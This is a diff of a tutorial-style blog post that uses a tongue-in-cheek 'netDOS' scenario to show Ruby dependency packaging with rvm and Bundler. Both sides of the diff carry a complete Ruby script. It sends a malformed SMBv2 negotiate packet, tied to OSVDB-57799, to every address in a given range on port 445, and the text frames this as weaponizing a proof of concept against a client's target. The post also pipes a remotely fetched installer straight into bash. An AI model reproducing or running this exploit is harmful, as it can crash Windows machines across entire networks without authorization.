@@ -11,6 +11,7 @@ Consider the following scenario.  You and your tech collective have been tasked 
 
 Install a Ruby 1.9.1 environment with rvm (pay attention to any notes on
 modifying your .bashrc here):
+
         $ bash < <( curl http://rvm.beginrescueend.com/releases/rvm-install-head )
         $ exec ~/.bashrc
         $ rvm install 1.9.1 ; rvm 1.9.1
@@ -18,13 +19,16 @@ modifying your .bashrc here):
 
 Pull down the code for the netDOS app (contents of this are described below)
         # Note: no one but your tech-collective and client has access to this repo.
+
         $ git clone git://your.sketchy.crew.org/netDos.git
         $ cd netDos
 
 Install the dependencies for the netDOS app:
+
         $ bundle install
 
 Run netDos:
+
         $ ./netDos 10.1.1.1/24
 
 To make achieve this level of ease all the team had to do is specify the specific dependencies for netDOS in a file called `Gemfile` in the apps main directory that references the specific version of the libraries used, optionally with a path to a source location.  ie:
@@ -42,47 +46,50 @@ Then roll it up for deployment with (saving all dependencies in your app's main 
 A quick look through recent vulnerabilities brings you to a likely match from OSVDB-57799 [3] which describes a flaw in the SMBv2 that can trigger a dereference 
 to an out of bound memory area.  And bonus for you (cause you have been working late nights and all your get for all this activisty work is dumpstered bagels) someone already wrote a proof of concept [4].  All you have to do is weaponize it for your clients target [5]:
 
-        #!/usr/bin/env ruby
-        require 'ronin/extensions/ip_addr'
-        require 'ronin/network/tcp'
-        payload = [
-          "\x00\x00\x00\x90", # Begin SMB header: Session message
-          "\xff\x53\x4d\x42", # Server Component: SMB
-          "\x72\x00\x00\x00", # Negociate Protocol
-          "\x00\x18\x53\xc8", # Operation 0x18 & sub 0xc853
-          "\x00\x26", # Process ID High: --> :) normal value should be "\x00\x00"
-          "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xfe",
-          "\x00\x00\x00\x00\x00\x6d\x00\x02\x50\x43\x20\x4e\x45\x54",
-          "\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31",
-          "\x2e\x30\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00",
-          "\x02\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57",
-          "\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61",
-          "\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00\x02\x4c",
-          "\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54\x20\x4c",
-          "\x4d\x20\x30\x2e\x31\x32\x00\x02\x53\x4d\x42\x20\x32\x2e",
-          "\x30\x30\x32\x00"
-        ].join
+{% highlight ruby %}
+#!/usr/bin/env ruby
+require 'ronin/extensions/ip_addr'
+require 'ronin/network/tcp'
 
-        unless ARGV.length > 0
-          puts "usage: [IPv4 | IPv6 | CIDR Range | Globbed Range] ..."
-          puts "examples:"
-          puts " #{$0} 10.1.1.1"
-          puts " #{$0} 10.1.1.1/24"
-          puts " #{$0} 10.1.*.1-5"
-          exit -1
-        end 
+payload = [
+  "\x00\x00\x00\x90", # Begin SMB header: Session message
+  "\xff\x53\x4d\x42", # Server Component: SMB
+  "\x72\x00\x00\x00", # Negociate Protocol
+  "\x00\x18\x53\xc8", # Operation 0x18 & sub 0xc853
+  "\x00\x26", # Process ID High: --> :) normal value should be "\x00\x00"
+  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xfe",
+  "\x00\x00\x00\x00\x00\x6d\x00\x02\x50\x43\x20\x4e\x45\x54",
+  "\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31",
+  "\x2e\x30\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00",
+  "\x02\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57",
+  "\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61",
+  "\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00\x02\x4c",
+  "\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54\x20\x4c",
+  "\x4d\x20\x30\x2e\x31\x32\x00\x02\x53\x4d\x42\x20\x32\x2e",
+  "\x30\x30\x32\x00"
+].join
 
-        ARGV.each do |range|
-          IPAddr.each(range) do |ip|
-            begin
-              puts "[-] Sending SMB payload to #{ip} ..."
-              Net.tcp_connect_and_send(payload,ip,445)
-            rescue
-              puts "[!] Skipping #{ip}"
-              next
-            end
-          end
-        end
+unless ARGV.length > 0
+  puts "usage: [IPv4 | IPv6 | CIDR Range | Globbed Range] ..."
+  puts "examples:"
+  puts " #{$0} 10.1.1.1"
+  puts " #{$0} 10.1.1.1/24"
+  puts " #{$0} 10.1.*.1-5"
+  exit -1
+end 
+
+ARGV.each do |range|
+  IPAddr.each(range) do |ip|
+    begin
+      puts "[-] Sending SMB payload to #{ip} ..."
+      Net.tcp_connect_and_send(payload,ip,445)
+    rescue
+      puts "[!] Skipping #{ip}"
+      next
+    end
+  end
+end
+{% endhighlight %}
 
 This file would be included in the repo with the Gemfile as well as the 
 Gemfile.lock, and all of the files installed in vendor/cache after running `bundle package`.  Then finish the night by sending off an email with the simple instructions above to your friends, grab beverage of your choice, and head down to the tracks to enjoy the rest of your evening.
